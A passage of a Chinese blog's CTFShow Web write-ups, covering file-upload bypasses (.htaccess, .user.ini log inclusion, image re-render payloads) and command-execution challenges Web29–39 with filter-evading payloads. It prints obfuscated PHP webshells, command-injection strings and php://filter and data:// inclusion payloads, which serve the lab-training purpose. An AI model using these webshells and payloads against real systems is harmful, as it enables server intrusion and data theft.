invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">用法  php exp.php a.png</span><br></pre></td></tr></table></figure><p>用群主提供的jpg二次渲染专用图片</p><p>先上传一遍 然后下载下来运行脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在linux中运行</span></span><br><span class="line">php exp.php a.jpg</span><br></pre></td></tr></table></figure><p>生成一个payload_a.jpg文件</p><p>再上传</p><p>post 1&#x3D;system(“tac flag.php”)；</p><p>这里用群主的图片试了n多次也没成功又找了一张成功了 </p><p>已经渲染过直接使用，不用跑脚本了</p><p><img src="/posts/fdac7c8/payload.jpg" alt="payload"></p><h2 id="Web166"><a href="#Web166" class="headerlink" title="Web166"></a>Web166</h2><p>只能上传zip文件</p><p><img src="/posts/fdac7c8/image-20220421213533539.png" alt="image-20220421213533539"></p><p>先上传然后更改内容 蚁剑连接 url为下载链接</p><h2 id="Web167"><a href="#Web167" class="headerlink" title="Web167"></a>Web167</h2><p>.htaccess绕过</p><p>先上传.htaccess文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt;  </span><br><span class="line">        SetHandler application/x-httpd-php  </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>然后上传1.jpg内容为一句话</p><p>蚁剑链接</p><p>其他方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg   //将.jpg后缀的文件解析 成php</span><br></pre></td></tr></table></figure><p>如果flag不是php文件，那么还可以像.user.ini一样在当前目录加载一个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file &#x27;flag&#x27;</span><br></pre></td></tr></table></figure><h2 id="Web168"><a href="#Web168" class="headerlink" title="Web168"></a>Web168</h2><p>基础免杀可利用短标签进行命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`tac ../flagaa.php`?&gt;</span><br></pre></td></tr></table></figure><p><img src="/posts/fdac7c8/image-20220421231200875.png" alt="image-20220421231200875"></p><p>访问xxx&#x2F;upload&#x2F;1.php</p><p>其他免杀姿势</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span>[<span class="number">0</span>].<span class="variable">$b</span>[<span class="number">1</span>].<span class="variable">$b</span>[<span class="number">2</span>].<span class="variable">$b</span>[<span class="number">3</span>].<span class="variable">$b</span>[<span class="number">4</span>].<span class="variable">$b</span>[<span class="number">5</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">strrev</span>(<span class="string">&#x27;metsys&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">substr</span>(<span class="string">&#x27;1s&#x27;</span>,<span class="number">1</span>).<span class="string">&#x27;ystem&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Web169"><a href="#Web169" class="headerlink" title="Web169"></a>Web169</h2><p>先在upload中上传一个index.php</p><p>内容为123</p><p><img src="/posts/fdac7c8/image-20220421232210882.png" alt="image-20220421232210882.png"></p><p>再上传一个.user.ini 包含日志文件</p><p><img src="/posts/fdac7c8/image-20220421233303438.png" alt="image-20220421233303438"></p><p>再ua中写入一句话</p><p>蚁剑连接 xxx&#x2F;upload</p><h2 id="Web170"><a href="#Web170" class="headerlink" title="Web170"></a>Web170</h2><p>同169</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.前端校验修改前端代码，或burp抓包<br>2.后端校验前端上传php,burp修改MIME<br>3.user.ini<br>4.文件魔术字节欺骗php过滤，采用简写<br>5.php骚操作<br>6.日志包含绕过<br>7.GlF89A绕过getimagesize<br>8.png图片二次渲染<br>9.jpg图片二次渲染<br>10.zip文件上传<br>11.apache解析漏洞<br>12.木马免杀</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow Web入门_命令执行</title>
      <link href="/posts/999021e8/"/>
      <url>/posts/999021e8/</url>
      
        <content type="html"><![CDATA[<p>命令执行绕过姿势：<a href="https://blog.csdn.net/qq_45836474/article/details/107248010">https://blog.csdn.net/qq_45836474/article/details/107248010</a></p><h2 id="Web29"><a href="#Web29" class="headerlink" title="Web29"></a>Web29</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里使用正则过滤了flag</p><p>绕过方法:<a href="https://www.cnblogs.com/zzjdbk/p/13491028.html">https://www.cnblogs.com/zzjdbk/p/13491028.html</a></p><p>可以使用重造变量的方法来读取flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system($_GET[&#x27;a&#x27;]);&amp;a=cat flag.php;</span><br></pre></td></tr></table></figure><p>或者</p><p>使用双引号过滤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo `cat fl&#x27;&#x27;ag.php`;</span><br></pre></td></tr></table></figure><p>查看源代码拿到flag</p><h2 id="Web30"><a href="#Web30" class="headerlink" title="Web30"></a>Web30</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这次过滤了flag，system，php</p><p>使用引号过滤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo `cat fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;</span><br></pre></td></tr></table></figure><p>查看源代码拿到flag</p><h2 id="Web31"><a href="#Web31" class="headerlink" title="Web31"></a>Web31</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这次过滤了<code> flag system php cat sort shell . 单引号和空格</code></p><p>这里用重造变量的方法</p><p>system不能用了换成eval</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">eval</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">参数a的system可以换成passthru()</span></span><br><span class="line">?c=eval($_GET[&quot;a&quot;]);&amp;a=system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure><p>其他payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用tac绕过对cat的过滤</span></span><br><span class="line"><span class="comment"># 用%09绕过对空格的过滤</span></span><br><span class="line">?c=<span class="keyword">echo</span>`tac%<span class="number">09</span>fl*`;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用passthru绕过system的过滤</span></span><br><span class="line"><span class="comment"># tac饶过cat的过滤</span></span><br><span class="line">?c=<span class="title function_ invoke__">passthru</span>(<span class="string">&quot;tac%09f*&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面这个没研究明白</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><p>查看源代码拿到flag</p><h2 id="Web32"><a href="#Web32" class="headerlink" title="Web32"></a>Web32</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这次比上一次多过滤了 反引号，分号，echo以及括号</p><p>对于;的过滤可以使用?&gt;来绕过 因为php的最后一条语句不需要分号</p><p>但是由于括号的过滤，只能使用一些不需要()的函数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用伪协议配合文件包含漏洞</span></span><br><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>php伪协议详解：<a href="https://segmentfault.com/a/1190000018991087#item-2">https://segmentfault.com/a/1190000018991087#item-2</a></p><p>得到一段base64 解密得到flag</p><h2 id="Web33"><a href="#Web33" class="headerlink" title="Web33"></a>Web33</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这此过滤又加了一个双引号</p><p>还是可以使用伪协议绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>base64解码得到flag</p><h2 id="Web34"><a href="#Web34" class="headerlink" title="Web34"></a>Web34</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这次又加上了冒号但是他只对c的传参进行了过滤</p><p>还可以使用伪协议</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>base64解码拿到flag</p><h2 id="Web35"><a href="#Web35" class="headerlink" title="Web35"></a>Web35</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这次又多了\</p><p>但是还是只对c进行了过滤</p><p>使用伪协议过滤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>base64解码拿到flag</p><h2 id="Web36"><a href="#Web36" class="headerlink" title="Web36"></a>Web36</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这次多了&lt; &#x3D; 以及0-9的过滤</p><p>把伪协议payload中的1改为a</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>base64解码拿到flag</p><h2 id="Web37"><a href="#Web37" class="headerlink" title="Web37"></a>Web37</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;      </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>include文件包含并且过滤了flag</p><p>这里用<code>data://</code>协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(<span class="string">&quot;cat fla*&quot;</span>)?&gt;</span><br><span class="line">或使用<span class="built_in">base64</span>封装数据</span><br><span class="line">?c=data://text/plain;<span class="built_in">base64</span>,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><p>右键源代码获取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;    </span><br><span class="line">    &#125;        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>继续使用data:&#x2F;&#x2F;协议</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><p>右键原代码获取flag</p><h2 id="Web39"><a href="#Web39" class="headerlink" title="Web39"></a>Web39</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这次文件包含 题目中直接加了后缀所以这次不需要后缀</p><p>但是这还可以使用data:&#x2F;&#x2F;伪协议</p><p>data:&#x2F;&#x2F;text&#x2F;plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 